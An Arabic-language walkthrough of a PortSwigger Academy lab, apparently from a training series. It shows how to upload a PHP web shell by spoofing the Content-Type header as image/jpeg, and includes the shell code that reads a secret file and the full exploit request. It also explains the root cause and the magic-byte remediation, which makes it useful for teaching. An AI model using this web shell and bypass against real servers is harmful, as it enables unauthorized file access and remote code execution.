# Lab 02 — Web Shell Upload via Content-Type Restriction Bypass (تجاوز فحص MIME-Type)

[![التصنيف](https://img.shields.io/badge/الفئة-File%20Upload-indigo)]()
[![النوع](https://img.shields.io/badge/النوع-File%20Upload%20—%20Content-Type%20Bypass-orange)]()
[![مستوى الخطورة](https://img.shields.io/badge/الخطورة-حرج%20(Critical)-critical)]()
[![المصدر](https://img.shields.io/badge/المصدر-PortSwigger%20Academy-blue)](https://portswigger.net/web-security/file-upload)

> هذا الشرح جزء من سلسلة [معامل ثغرات رفع الملفات (File Upload)](./README.md) — أكاديمية PortSwigger.

---

## 1. بطاقة تعريف اللاب (Overview)

| الحقل | التفاصيل |
|---|---|
| **اسم اللاب** | Lab 02 — Web Shell Upload via Content-Type Restriction Bypass (تجاوز فحص MIME-Type) |
| **تصنيف الثغرة** | File Upload — Content-Type Bypass |
| **معيار الضعف (CWE)** | CWE-434: Unrestricted Upload of File with Dangerous Type |
| **مستوى الخطورة** | حرج (Critical) |
| **الهدف من اللاب** | رفع ويب شل PHP بتزوير هيدر Content-Type ليكون image/jpeg واستخراج سر carlos. |

---

## 2. فكرة اللاب وسيناريو المشكلة (Concept & Vulnerability Mechanism)

وضع المطور هنا حماية تفحص نوع الملف المرفوع: يشترط السيرفر أن يكون الملف من نوع صورة مسموح (`image/jpeg` أو `image/png`).

**الخلل الفكري هنا:** السيرفر لا يفحص محتوى الملف الحقيقي، بل يكتفي بقراءة ترويسة `Content-Type` المرفقة في طلب الـ HTTP Multipart! بما أن هذه الترويسة يرسلها المتصفح، يستطيع المهاجم رفع ملف `shell.php` واعتراض الطلب في Burp Suite وتغيير `Content-Type: application/x-php` إلى `Content-Type: image/jpeg`! سينخدع السيرفر ويقبل الملف ويحفظه كامتداد `.php`، ثم ينفذه عند طلبه!

---

## 3. التحليل الجذري للسبب (Root Cause Analysis)

### 🔴 وجهة نظر المهاجم (Attacker Perspective):
المهاجم يغير ترويسة Content-Type في طلب الرفع لتطابق نوع صورة مسموح به لخداع فلتر السيرفر السطحي.

### 🟢 وجهة نظر المدافع والمطور (Defender Perspective):
المطور وثق في ترويسة مرسلة من العميل للتحقق من نوع الملف بدلاً من فحص البايتات الحقيقية للملف في السيرفر.

---

## 4. خطوات الاستغلال والحل بالتفصيل (Proof of Concept - PoC)

1. سجل دخولك بحساب `wiener:peter`.
2. جهز ملف `shell.php` بداخله: `<?php echo file_get_contents('/home/carlos/secret'); ?>`.
3. اضغط Upload avatar، واعترض الطلب في **Burp Suite Proxy**.
4. في طلب الـ Multipart، ابحث عن ترويسة الملف المرفوع:
`Content-Type: application/x-php`.
5. قم بتعديلها لتصبح:
`Content-Type: image/jpeg`.
6. أرسل الطلب (Forward)، ستلاحظ أن السيرفر قبل الملف ورفعه بنجاح!
7. توجه إلى رابط الملف المرفوع في المتصفح: `/files/avatars/shell.php` لقراءة السر وتقديمه.

---

## 5. أدلة الترافيك (Evidence: Request / Response)

### نموذج طلب الاستغلال (Exploit Request):
```http
POST /my-account/avatar HTTP/1.1
Host: <lab-id>.web-security-academy.net
Content-Type: multipart/form-data; boundary=----

------
Content-Disposition: form-data; name="avatar"; filename="shell.php"
Content-Type: image/jpeg

<?php echo file_get_contents('/home/carlos/secret'); ?>
------
```

### نموذج استجابة السيرفر (Server Response):
```http
HTTP/1.1 200 OK

The file avatars/shell.php has been uploaded.
```

---

## 6. الأثر الواقعي للثغرة (Impact)

تجاوز فلاتر أنواع الملفات والوصول لتنفيذ الأوامر عن بُعد.

---

## 7. الحماية والإغلاق البرمجي (Remediation)

التحقق من نوع الملف الحقيقي عبر فحص البايتات السحرية (Magic Bytes) على السيرفر وليس الاعتماد على ترويسات العميل.

---

## 8. المراجع الرسمية (References)

- [PortSwigger Web Security Academy — File Upload](https://portswigger.net/web-security/file-upload)
- [OWASP Top 10 — Vulnerabilities](https://owasp.org/)
- [CWE-434: Unrestricted Upload of File with Dangerous Type](https://cwe.mitre.org/data/definitions/434.html)

---
*تم إعداد هذا التوثيق للأغراض التعليمية واختبار الاختراق الأخلاقي المصرح به.*
